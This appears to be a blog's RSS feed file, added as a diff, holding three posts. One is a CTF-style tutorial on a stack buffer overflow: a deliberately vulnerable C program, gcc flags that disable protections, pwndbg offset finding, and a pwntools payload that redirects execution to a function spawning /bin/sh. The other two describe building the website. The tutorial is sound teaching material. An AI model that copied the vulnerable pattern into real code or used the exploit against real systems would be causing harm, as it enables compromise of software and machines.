@@ -1,0 +1,287 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title><![CDATA[Markel Mencía's blog]]></title>
+        <description><![CDATA[Markel's blog, mainly focused on Computer Science but also about other topics.]]></description>
+        <link>https://markelmencia.github.io</link>
+        <generator>RSS for Node</generator>
+        <lastBuildDate>Thu, 18 Dec 2025 16:45:01 GMT</lastBuildDate>
+        <atom:link href="https://markelmencia.github.io/rss.xml" rel="self" type="application/rss+xml"/>
+        <language><![CDATA[en]]></language>
+        <item>
+            <title><![CDATA[How to perform a simple buffer overflow]]></title>
+            <description><![CDATA[<h1>How to perform a simple buffer overflow</h1>
+<p>Buffer Overflow attacks are one of the most common types of attacks, and it has been so for the last decade. Unfortunately, they tend to be quite powerful, granting in some cases full system control to the attacker due to how close to the bare-metal these attacks tend to be performed on. BOFs have been in the cybersecurity scene for decades, giving headaches to security experts and full-on companies alike. And even if language compilers have worked to prevent these attacks and many tools have been developed to detect related issues, buffer overflows are definitely still a thing of the present.</p>
+<p>Knowing how these vulnerabilities are created, or at least understanding their roots is knowledge that might be quite useful for any developer, even if they are not specialized in the cybersecurity space.</p>
+<p>As I'll be participating in a CTF competition this weekend, I decided to refresh my memory on how these vulnerabilities come to be, because I find them very interesting. As I've mentioned, they are quite close to the bare-metal (in order to perform a buffer overflow attack, we'll need to be in contact with assembly!). Because of this, it can be overwhelming to perform a BOF attack (let alone understand it). Moreover, there are many tools to choose from. This is why I'm writing this. This is a small tutorial in which I'll show how an attack is done from scratch. Let's get on with it!</p>
+<h2>The big picture</h2>
+<p>Before we dive into code, first we have to understand how these vulnerabilities come to be.</p>
+<p>When a function is executing code, said function can read/write values in both local or global variables or arrays. Global variables are stored in the program memory, but since local variables are only meant to be read or written inside one function, these get stored elsewhere: the call stack.</p>
+<h3>The call stack</h3>
+<p>The call stack (we'll be calling it stack from now on) is the data structure used for storing local variables inside a function. During the function runtime, different instructions will interact with the stack. A stack contains some blocks that store data. You might think of a stack as an array, but they have a very important distinction: a stack is a LIFO structure (Last In First Out). Think of it as a pile of books: you form a "tower" of books by placing them on top of each other, one by one. The first book you placed will be on the bottom, and the last one will be on the top. The same applies with a stack, you add (<strong>Push</strong>) data on top of other data. In order to get the first value you pushed, you'll need to <strong>Pop</strong> the values above it until you get to the one you want.</p>
+<p>A function works the same way with local variables, they are pushed and popped in and out of the stack. But local variable values are not the only thing stored in the stack!</p>
+<h3>How do functions work?</h3>
+<p>We all know what functions are. But have you ever wondered how they work on the inside?</p>
+<p>Programs are a set of ordered instructions. These instructions are stored in memory, and the program runs through them. Each program has a pointer that stores the address of the next function that will be executed.</p>
+<pre><code>> 0x0001: add x1, x2, x3
+0x0002: sub x3, x2, x1
+0x0003: add x4, x7, x1
+
+RIP: 0x0002
+</code></pre>
+<p>In this example, the instruction pointer (RIP, Register Instruction Pointer) points to the address 0x0002. This means that the next instruction that will be executed will be the <strong>sub</strong> instruction.</p>
+<pre><code>0x0003: add x2, x4, x1
+> 0x0004: jmp 0xAEAE
+0x0005: add x4, x4, x3
+
+RIP: 0xAEAE
+</code></pre>
+<p>The code we write can dictate what instruction will be executed next, as we can see in this example. <strong>jmp</strong> is a jump instruction, that will jump to the address specified, in this case 0xAEAE.</p>
+<p>In order to run functions, two things will happen:</p>
+<pre><code>_start:
+	call a_function
+	sub x3, x2, x1
+	
+a_function:
+	add x1, x2, x3
+	ret
+</code></pre>
+<p>This code will call the function <code>a_function</code> using the instruction <code>call</code>. <code>call</code> does two things:</p>
+<ol>
+<li>The address of the next instruction after <code>call</code> (in this case <code>sub</code>) will be <strong>pushed into the stack</strong>.</li>
+<li>The code modifies the value of the instruction pointer to the address of the function called (in this case <code>a_function</code>).</li>
+</ol>
+<p>Pushing the return address (the address of <code>sub</code>) to the stack is necessary because the function needs to know where to return once the <code>ret</code> instruction is reached.  Additionally, we know that the return address will always be at the bottom of the stack, because it is the first value that gets pushed into it. <code>ret</code> essentially gets the value by popping it, and jumps into it, to make the program run the code after the <code>call</code> instruction. Either way, we can see that the return address is stored in the same place where the local variables of the function get stored, the stack.</p>
+<h2>The issue</h2>
+<p>Now that we've seen that the return address of a function and its local data share space, one could think that there could be a way to somehow overwrite the return value. Let's not think about the how for now, but about the why this could be catastrophic.</p>
+<p>If we overwrite the return value, this would mean that once the function finishes, the program would jump to that overwritten address. If we change that stack position to store an address of a malicious function (one that, for example would grant us access to a shell), <code>ret</code> would jump to that address, in which dangerous code would be executed, with which we could potentially take over the system. Pretty metal.</p>
+<p>This is achieved with a properly orchestrated <strong>Buffer Oveflow</strong>.</p>
+<h2>Overflowing the stack</h2>
+<p>Imagine that we have a local array in a function. This array is used to temporally store some data (a buffer), and it has a fixed size of five. The stack would look something like this:</p>
+<p><img src="/img/posts/bof-stack.png" alt="A stack example"></p>
+<p>Since the buffer is 5 elements long (let's not care about what type is it storing for now), the stack will only assign five blocks for it. If we somehow add more than five elements to the array, we could overflow the stack:</p>
+<p><img src="/img/posts/bof-stack-of.png" alt="An overflowed stack"></p>
+<p>Notice how where the return address was, now there is the 6th element of the buffer. We've overwritten the return address. If we manage to control what exactly <code>buf[6]</code> is, we'll be able to make the function return to wherever we tell it to, for example malicious code.</p>
+<p>These are the fundamentals of a buffer overflow. Now, let's learn how to make it work with code.</p>
+<h2>The code</h2>
+<p>I wrote this simple example to showcase how a buffer overflow is done:</p>
+<pre><code class="language-c">#include &#x3C;stdio.h>
+#include &#x3C;unistd.h>
+#include &#x3C;stdlib.h>
+
+void exploit() {
+	printf("Exploit function executed\n");
+	system("/bin/sh"); // Opens a shell instance, giving us system access
+}
+
+void unsafe() {
+	printf("Enter a string:\n");
+	char buffer[16] = {0};
+	read(0, buffer, 50);
+	return;
+}
+
+int main() {
+    unsafe();
+	return 0;
+}
+</code></pre>
+<p>Take a look at the main function. It calls <code>unsafe()</code>, which asks for input, stores it in a buffer and then returns, finishing the program. However, we can see a function called <code>exploit()</code>, which is defined but is never called. This function, as can be seen, would allow us to open a shell with that program, ideally granting us access to other parts of the system.</p>
+<p>Our goal is to call this function. As we've seen in the visual example before, if we know the address in which this function starts, and we manage to create a buffer overflow in the unsafe function (which is, as a matter of fact, unsafe), we'll be able to run the <code>exploit()</code> function.</p>
+<h2>A important caveat</h2>
+<p>If you compile this source file with the regular <code>gcc unsafe.c -o unsafe</code>, eventually you'll realize that you won't be able to perform the overflow. This is because compilers have gone a long way in terms of offering binary security by default. The gcc compiler, without you having to worry about it, adds some layers of security to your programs, such as randomizing function addresses, removing execution permissions from the stack, and more.</p>
+<p>In order to actually perform a buffer overflow with this program, we'll have to disable some of these measures. You might wonder what's the point to execute a vulnerable program in an already vulnerable environment. Well, firstly, this is just a showcase. CTF challenges often turn off these measures too. And again, let me remind you that even with these options off, buffer overflows have been the most common type of attack this past decade.</p>
+<p>With this out of the way, here's the command we'll use for compiling:</p>
+<pre><code class="language-bash">$ gcc unsafe.c -o unsafe -fno-stack-protector -no-pie -z execstack
+</code></pre>
+<h2>Running the binary</h2>
+<p>With the binary ready to go, we can begin making tests:</p>
+<pre><code class="language-bash">$ ./unsafe
+Enter a string:
+hello world
+$
+</code></pre>
+<p>Nothing out of the ordinary. We type "hello world" and the input gets copied into the buffer. Before doing anything else, let's look back at the code, maybe you have already figured what's wrong with it:</p>
+<pre><code class="language-c">void unsafe() {
+	printf("Enter a string:\n");
+	char buffer[16] = {0};
+	read(0, buffer, 50);
+	return;
+}
+</code></pre>
+<p>It doesn't take long to notice that the buffer size (16) is much smaller than the amount of characters that are read from the standard input (50). This will copy the content of the input to the buffer, but it will NOT stop at the maximum length of the buffer. Each character will be pushed into the stack, but the stack won't grow longer because the buffer size was meant to be 16, no more. This will overwrite values in the stack, and if the input was long enough, it could even reach the return address and overwrite it too.</p>
+<pre><code class="language-bash">$ ./unsafe
+Enter a string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+$
+</code></pre>
+<p>Notice how if we type in a bigger input, a segmentation fault raises. Segmentation faults are not exactly verbose without the proper tools, so executing this binary in a plain shell won't really give us much information.</p>
+<h2>The tools we'll use</h2>
+<p>Binary exploitation is very difficult without tools that help us debug or prepare exploits. There are plenty out there, but for this article I'll use two.</p>
+<h3>pwndbg</h3>
+<p>pwndbg is a GDB (GNU Debugger) extension that eases binary exploitation. We'll see its uses along the way. <a href="https://pwndbg.re/stable/setup/">Installing it</a> is quite easy.</p>
+<h3>pwntools</h3>
+<p>If you're slightly into the CTF world, you've surely used this framework before. In this case, we'll use to it generate the proper input to exploit the binary. <a href="https://docs.pwntools.com/en/stable/install.html">The installation</a> is also pretty easy.</p>
+<h2>The exploit</h2>
+<p>Let's run the program again, but this time inside pwndbg:</p>
+<pre><code class="language-bash">$ pwndbg unsafe
+pwndbg> run
+Enter a string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre>
+<p>Once we hit enter, the segmentation fault will happen again, obviously. But this program will be able to give us more information about it:</p>
+<p><img src="/img/posts/bof-pwndbg.png" alt="After-execution status"></p>
+<p>The REGISTERS tab prints out the content of each register in the CPU the moment the segmentation fault happened. DISASM tells us what was the last instruction executed.</p>
+<p>And then we see the stack:
+<img src="/img/posts/bof-pwndbg-stack.png" alt="After-execution status"></p>
+<p>This is a snapshot of the stack the moment the segmentation fault happened. Does something look familiar? We've successfully overflowed the buffer! This execution has made it so other parts of the stack have been filled with A's. And not only that, but we've also managed to change the return address of the function. We can see this in DISASM:</p>
+<p><img src="/img/posts/bof-pwndbg-disasm.png" alt="DISASM information"></p>
+<p>The ret instruction tried to jump to the address 0x414141..., but it wasn't able to because that address wasn't inside the memory scope of the program. Because of that, a segmentation fault raised: it was trying to access memory that wasn't theirs.</p>
+<p>The only thing that's left is to know exactly how many A's we need to include in order to reach the return address block of the stack, and then type the address to the <code>exploit()</code> function. We are quite close, so let's get on with it.</p>
+<h2>Patterns</h2>
+<p>An easy way to know where exactly the return address is stored on in the stack is by using a string pattern. This is a string that follow a specific pattern that it's easy to trace. pwndbg offers a tool just for that. Let's reopen it:</p>
+<pre><code>$ pwndbg unsafe
+pwndbg>
+</code></pre>
+<p>First we need to generate the pattern and store it in a file. We don't really need to know how the pattern works, pwndbg does it for us. This is how it's done:</p>
+<pre><code>pwndbg> cyclic 200 pat
+Written a cyclic sequence of length 200 to file pat
+</code></pre>
+<p>Now we have a file that contains this cyclic pattern, named "pat". It's 200 characters long, which is more than enough. Let's run the program with this pattern as input with a redirection:</p>
+<pre><code>pwndbg> run &#x3C; pat
+</code></pre>
+<p><img src="/img/posts/bof-pwndbg-disasm-pattern.png" alt="DISASM information with pattern"></p>
+<p>Not much has changed, the overflow still happened. The difference is that this pattern is traceable. With a simple command we can find the position of any part of that pattern, meaning that if we plug in the part of the pattern that ended up in the return address (0x6161...64), we'll know the offset we need:</p>
+<pre><code>pwndbg> cyclic -l 0x6161616161616164
+Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
+Found at offset 24
+</code></pre>
+<p>That's the offset! This means that we need to type in 24 A's (or any character), and after that we'll get to the return address block.</p>
+<h2>Getting the exploit function address</h2>
+<p>We now know <em>where</em> we need to input the exploit function address, but we still don't know what that address is. To get it, we can use pwndbg as well:</p>
+<pre><code>pwndbg> info functions
+0x0000000000401000  _init
+0x0000000000401030  puts@plt
+0x0000000000401040  system@plt
+0x0000000000401050  read@plt
+0x0000000000401060  _start
+0x0000000000401090  _dl_relocate_static_pie
+0x00000000004010a0  deregister_tm_clones
+0x00000000004010d0  register_tm_clones
+0x0000000000401110  __do_global_dtors_aux
+0x0000000000401140  frame_dummy
+0x0000000000401146  exploit
+0x000000000040116b  unsafe
+0x00000000004011ab  main
+0x00000000004011c0  _fini
+</code></pre>
+<p><code>info functions</code> prints out the address of every function in our code. Let's write down the <code>exploit</code> function address.</p>
+<p>There's a small intricacy, though. We need one more address. This binary was compiled to be executed on a 64-bit architecture. Due to some optimizations made by the C library for 64-bit machines, and the fact that we will be executing a function (<code>exploit</code>) without calling it with <code>call</code>, we need to "align" the stack. There isn't a lot of information about this online, and the details aren't too important, so I'll leave it up to you if you want to inform yourself more on this, but what we need is to simulate a "double return". Instead of going directly to the <code>exploit()</code> function address, we'll jump into an address with another <code>ret</code> instruction on it, and this <code>ret</code> will be the one that will take us to the malicious function. For this, we just need to get the address of one <code>ret</code> instruction, and plug it right after the offset (24 A's) and before the address of <code>exploit</code>.</p>
+<p>Here's how we get an address to a <code>ret</code> instruction:</p>
+<pre><code>pwndbg> rop
+...
+0x00401016 : ret
+...
+</code></pre>
+<p><code>rop</code> will print quite a few useful addresses we might need for other programs, but for this one we just need one that has "ret" on it. Let's write this address too. Now we are ready to build the exploit string.</p>
+<h2>Creating the exploit string</h2>
+<p>We'll use pwntools for this, and a simple python script:</p>
+<pre><code class="language-python">from pwn import *
+
+OFFSET = 24
+RET_INSTRUCTION_ADDRESS = 0x00401016
+EXPLOIT_FUNCTION_ADDRESS = 0x00401146
+
+payload  = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS)
+payload += p64(EXPLOIT_FUNCTION_ADDRESS)
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>In a nutshell, this script generates a byte array with the string that has to be used as input and writes it to a file called "exploit". You just need to change the variables according to the results you've gathered with your debugging.</p>
+<p>Now we're ready to go! It's time to run the program using the generated file as input:</p>
+<pre><code>$ ./unsafe &#x3C; exploit
+Enter a string:
+Exploit function executed
+$
+</code></pre>
+<p>Done! No segmentation faults this time, and we managed to get inside the exploit function without it being called in the source code. The process is a bit long, but I can see this becoming very mechanic with some practice. This is one of the simplest buffer overflow examples you can do. Needless to say, there are many types of buffer overflows, some more complex than others, but the foundations are the same.</p>
+<p>If you want to do more CTF-style BOF challenges, there's a whole page dedicated to it: <a href="https://ropemporium.com/">ROP Emporium</a>. I'll surely be using it quite a bit these following days!</p>
+<h2>Conclusion</h2>
+<p>Buffer Overflows are a key exercise in cybersecurity. With them being so common, it's important to get the hang of them if you want to dive deeper into computer security.</p>
+<p>One thing I haven't went over in this article is about how to avoid these vulnerabilities in our code. It turns out that at times it might not be as easy as it seems, but following some good practices is not hard, and it might save you some day. If knowing how to exploit them is important, knowing how to avoid them is much more than that! A professor I had liked to mention how code integrity shouldn't be a step in development, but a mindset throughout the whole process. Maybe the fact that this advice is ignored is precisely why these vulnerabilities are still happening so much.</p>
+]]></description>
+            <link>https://markelmencia.github.io/blog/how-to-perform-bof</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/blog/how-to-perform-bof</guid>
+            <pubDate>Thu, 18 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[Website finished: My experience overall]]></title>
+            <description><![CDATA[<h1>Webpage finished: My experience overall</h1>
+<h4>December 11, 2025</h4>
+<p>After a long weekend of spending a considerable amount of hours designing, I've finally finished my page and deployed it!</p>
+<p>As I've mentioned <a href="/blog/front-end-nightmare">in my last post</a>, I've been meaning to create a personal portfolio/blog. Using a template was not something I was intending to do this time, so I decided to create the page from scratch, by myself. This led to a handful of roadblocks and desperation, but after a few attempts, I managed to get the foundations of the page working. With that out of the way, I started the actual designing process, which is what I'll be talking about today.</p>
+<h2>Working with Next.js</h2>
+<p>After struggling with two other frameworks, Next.js was the one I managed to get working. In retrospect, most of my issues arose when trying to implement <a href="https://tailwindcss.com/blog/tailwindcss-typography">tailwind/typography</a>, so I could've stayed in the other two frameworks I dropped. Still, working with Next.js was alright and I didn't run into many complicated issues. I've been told that Next.js is a bit of an overkill for a static page, but it worked for me. At the end of the day, performance is not exactly a priority in a static page. I focused more on readability and related issues.</p>
+<p>The component system was very intuitive and I got the hang of it pretty quickly. I'm pretty sure the components are more of a React feature, though? I'll still mention it here because quite frankly I don't know any better. Creating dynamic pages (in my case for each blog) was very simple as well, it's one of the first things I set up, and after doing so, I didn't have to think about them any more during the rest of the design process.</p>
+<p>Overall, I'm satisfied with Next.js. I'm happy I got to learn the fundamentals of a framework this popular. Honestly, I don't know when or if I'll have the change to use it for a different project, but if I do, at least I'll be able to know where to start.</p>
+<h2>Dealing with Tailwind</h2>
+<p>After all the struggles I've had with getting Typography to work, once installed, Tailwind turned out to be very easy to work with. And not only that, but it does the work it advertises pretty well. Out of the box, after configuring it to work on my articles,  the styles it applies definitely makes the text more readable. I only had to change a few things to adapt it to my page design, so it was definitely worth the struggle. I've been told that Markdown design is not easy at all. With Tailwind, I didn't really need to worry about it much.</p>
+<p>However, I'm technically not done with it. Something I haven't configured yet are codeblocks. I currently haven't written any post with code on it, so I've forgotten about them entirely. Once I need to write some code on my blog, I'll try to set it up correctly, I hope it isn't much trouble.</p>
+<h2>The more-complicated features</h2>
+<p>As it can be seen, my page is far from complex, but if I had to highlight what has been the hardest features to implement, I'd say the search bar and the dark mode.</p>
+<h3>The search bar</h3>
+<p>In the blog section, you can search blogs with the search bar. I wanted to implement this from the very beginning because I find it quite useful, and I wanted to dabble into more complex JavaScript. In the end, I actually got it working quite quickly, although it's important to mention that search bars are pretty well-documented, and finding information about them online wasn't too much of a chore.</p>
+<h3>Dark/light mode</h3>
+<p>This actually gave me a bunch of issues! I think my mistake was trying to do it in a CSS/JavaScript-centric approach first. I had already implemented a dark/light mode switcher for other projects with no frameworks, so I wasn't aware that there were tools for this in Next.js. After lots of attempts (and the browser cache trolling me once or twice), it works? It even changes according to your system theme, but I invite you to find the issue with it!</p>
+<h2>The design itself</h2>
+<p>When looking at the design, it's clear that I've inspired myself in the classic blog template design. This is because I didn't need much more than that, I wasn't looking for anything fancy. I think that for this page, I'm focusing on readability, so the less distractions there are for reading, the better. So after tinkering with different options, and the help of one of my friends with the specifics (thank you Litzy), I've managed to build something I'm quite satisfied with, and from scratch! That was my objective from the very beginning. Hopefully I've found a balance between simplicity and enough details for the page to be appealing.</p>
+<p>This is all from me for now. Semester finals are next week, so I don't know if I'll have much time to write more, but after that I'll surely have some more time to work on personal projects. Christmas is right around the corner! December always passes by so quickly, so I'll try to make the most of it.</p>
+<p>~ Markel</p>
+]]></description>
+            <link>https://markelmencia.github.io/blog/webpage-finished-my-experience</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/blog/webpage-finished-my-experience</guid>
+            <pubDate>Thu, 11 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[First post: Front-end nightmare]]></title>
+            <description><![CDATA[<h1>First post: Front-end nightmare</h1>
+<h4>December 5, 2025</h4>
+<p>I have always liked system-level development better. It is what I've grown to like and hopefully what I'll keep enjoying in the future. I'm just more comfortable with low-level programming, even though admittedly, more often than not, some concepts can be anything but intuitive.</p>
+<p>Regardless, sometimes I do dabble into higher-level environments for a change, especially recently because some university projects demanded so. It's something I can definitely enjoy. In a recent hackathon I participated in, I ended up designing a webapp. At that time I had no experience with JavaScript whatsoever, and learning it, albeit confusing, was quite fun.</p>
+<p>More recently, I decided to try to build my own page from scratch, as a sort of portfolio, and a place where I could write about whatever I felt like. Usually, to build a page like that, you'd resort to the countless free-to-use <a href="https://hexo.io/">Hexo</a>/<a href="https://themes.gohugo.io/">Hugo</a> templates available; they're easy to set up, nice to the eye, and they let you minimize your concerns about the design side of developing a blog. They even allow you to write articles in Markdown (like this one I'm currently writing), which makes it very easy to post, even for people not accustomed to coding. I had used templates like these before, and I have no issue with them. In fact, I highly recommend their use. Nevertheless, I wanted to try something new: frameworks.</p>
+<p>By all means, it was hard.</p>
+<h2>Choosing a framework</h2>
+<p>It's a common gag in the front-end development community to say that one of the most difficult parts of developing an application is choosing a proper framework for it. And of course, I got to experience that in my own way.</p>
+<p>At first sight, one could claim that choosing a framework for my necessities (a static page with some features to ease the creation of posts) wouldn't be hard, and they'd probably be correct. But for me, it was not easy at all.</p>
+<h3>Vite-SSG + Vue</h3>
+<p>Bold first choice, especially considering the fact that the first time I used Vue was that very same day. I chose <a href="https://github.com/antfu-collective/vite-ssg">Vite-SSG</a> because it was light and it used Vue. I had learned the basics of Vue that very same day for an assignment, and this framework seemed like a perfect excuse to dive deeper into that framework. Futhermore, it was specialized for server-side generation pages (hence SSG), which is another name for static pages. However, I couldn't even get it running. For reasons unknown to me, the build always failed. I followed many guides that used different methods and none worked, most likely because of me. After an hour and a half of failed attempts, I gave up and went home. Needless to say, I had a lot to learn.</p>
+<h3>Nuxt.js</h3>
+<p>This framework seemed promising for me. It looked very well documented and from what I can gather, it's performance is remarkable. <a href="https://nuxt.com/">Nuxt.js</a> is a bigger framework than the previous one, but it also works with Vue. Again, lured by my willingness to learn Vue, I gave it a test. This time, I had more success in the setup process. The build was working, and I even began making some small designs to get more accustomed to Vue.</p>
+<p>The problems started coming up when I began to implement Markdown support to the page, which is essential to what I was trying to do. It took a bunch of tinkering, but I managed to make it work: Text written in Markdown format would be translated to HTML, but there was one issue. The library I used for it only translated the format, but it had no style. That was expected, because for Markdown styling the <a href="https://tailwindcss.com/blog/tailwindcss-typography">tailwind/typography</a> library is used generally. Essentially, it provides "proses", which are predefined styles that format the text for you. Here's where everything went to waste, because again, I was unable to set it up. I'll speak more on this later.</p>
+<h2>The struggle of front-end vs back-end development</h2>
+<p>Empty-handed again, desperation was starting to kick in, and not in small doses! I can manage dealing with errors just fine, but only if I know where they come from. In development closer to the system-level, you can always debug more and more until you inevitably stumble across the issue. With front-end development, that might not always be the case, because there's more to it than just your code.</p>
+<h3>Abstraction</h3>
+<p>Abstraction is one part of it. For obvious reasons frameworks provide abstraction so that you don't need to worry about the intricacies of the lower-level side when you don't need to. However, I find that debugging becomes more challenging with abstraction because you don't necessarily know what's happening under the hood. This is why I'm often reluctant to big frameworks like <a href="https://www.djangoproject.com/">Django</a>. I acknowledge that they're powerful tools that can make you save time, but purely because of preference I rather use lighter frameworks that allow me to understand what happens under the hood better, with the price of having to write more code or having less abstraction.</p>
+<h3>Version control and compatibility</h3>
+<p>I have realized very quickly that the version you're running your framework on really does make or break it. Frameworks are in constant development, and making sure everything is updated or compatible with other libraries is not trivial, as it seems.</p>
+<p>I wasn't at all accustomed to these factors, and it showed. I want to make clear that the reason I dropped the previously mentioned frameworks was not because they weren't useful for me or because I thought they just weren't good. I just wasn't able to make them work because I wasn't ready. Additionally, the guides I was following were probably out of date. In lower-level areas, sometimes this might not matter, because the development of these areas tends to be more stable and long-term oriented. But in the ever-changing world of frameworks, this is definitely a thing to look out for.</p>
+<h2>Next.js</h2>
+<p>Back again on the drawing board, I remembered that a friend specialized in web development told me that Next.js is one of the general go-tos in the framework world. Countless tutorials exist for it and it's very well documented. With no other ideas, I tried it out. I followed a <a href="https://m.youtube.com/watch?v=kffGWfZCLlE&#x26;pp=ygUjaG93IHRvIGNyZWF0ZSBhIGJsb2cgd2l0aCBtYXJrZG93biA%3D">very good tutorial</a> that covered just enough to have what I needed, allowing me to take it from there. And, sure enough, after dealing with Tailwind versions for a second time, I finally got it working!</p>
+<h2>Where I'm at</h2>
+<p>After two whole days of aimlessly tinkering for hours, I finally have the base for my page. I'm writing this after having finished the setup, so the truth is that I'm just getting started. Usually, the complicated part in web development is the design of the page, not the setup. The good news is that I have more experience in this area, so hopefully I'll pull through. My idea is to make a basic blog design, like the ones you'd see in <a href="https://hexo.io/">Hexo</a> or <a href="https://themes.gohugo.io/">Hugo</a>, so nothing too fancy or complicated. Hopefully I'll make something decent!</p>
+<h2>What I've learned</h2>
+<p>Although there's some things I yet don't understand (and I'm far from being out of the woods), I do feel like I've learned quite a bit.</p>
+<p>Firstly, I can wholeheartedly say that dealing with the issues I found was very frustrating and something I wasn't at all ready for. I thought that the setup of a framework wouldn't be too difficult because the npm package manager has gone a long way and it definitely has made things easier over the years. But again, conflicting versions and different flavours of packages twisted my environments. In retrospect, I should've spent some more time making sure the versions of the libraries I was using were compatible with each other, which brings me to the next lesson.</p>
+<p>I've also learned that knowing how to document yourself is one of, if not the most important skill to learn if you want to work with frameworks. Usually, this is a given for Computer Science in general, but I feel like this area in particular is the one in which this shows the most, because frameworks are in constant development, and standards and practices change because of it. Additionally, frameworks create a lot of files, many of which you don't even need to open. Generally I can handle projects with many source files, but only if I know what they do. To give some credit to frameworks, however, Nuxt does <a href="https://nuxt.com/docs/4.x/directory-structure">a really good job</a> of documenting what each file does, and how their project structure works, and those articles helped for sure.</p>
+<h2>Technicality</h2>
+<p>Finally, I've also experienced first-hand that front-end development is far from trivial, something I knew already but hadn't experienced. There seems to be people that believe that front-end design is not development, or that it requires less skills than other programming areas. I couldn't agree less with that. It requires thought and good decision-making, you need to be aware of the tools available and know which is best for your use cases. And this isn't taking into account all the design involved in the web development process: not only do you need to have an idea of what you want to create but you also have to know how to code it. It is true that it is a very accessible field, with lots of options and ways to learn. But developing a full-fledged web application still requires to be very aware of those tools. And let's not even mention SEO and placement! There are many variables in web development, and these need to be properly addressed if you want a good overall project. I believe that an area being less technical than other doesn't imply that it's an easier area to work on. It definitely requires a different mindset, but that doesn't mean that you'll have an easier time with it.</p>
+<p>Sometimes, it is important to remember that. As someone who is more interested in research and in the more technical aspects of Computer Science, it's easy to get too caught up on the idea that you're in the cutting-edge of what we know about this field, and thinking that other areas less involved in that are "simpler" because of it. The truth is that they just require a different a skillset or motivation. One that a researcher, system administrator or Linux kernel developer might not have. And that's alright! The fun thing about Computer Science is that you'll never be able to grasp the full view. It's just that big of a field.</p>
+<p>Anyway, I will continue developing my page. There's a lot to do but I'm excited to see where it ends up. My idea, as I mentioned, is to build a portfolio to showcase my projects. But I especially want to make this page to post articles about whatever I feel like writing, because it's a hobby I quite like. Designing everything myself is clearly an overkill? Absolutely, but we'll see where it ends up!</p>
+<p>~ Markel</p>
+]]></description>
+            <link>https://markelmencia.github.io/blog/front-end-nightmare</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/blog/front-end-nightmare</guid>
+            <pubDate>Fri, 05 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+    </channel>
+</rss>
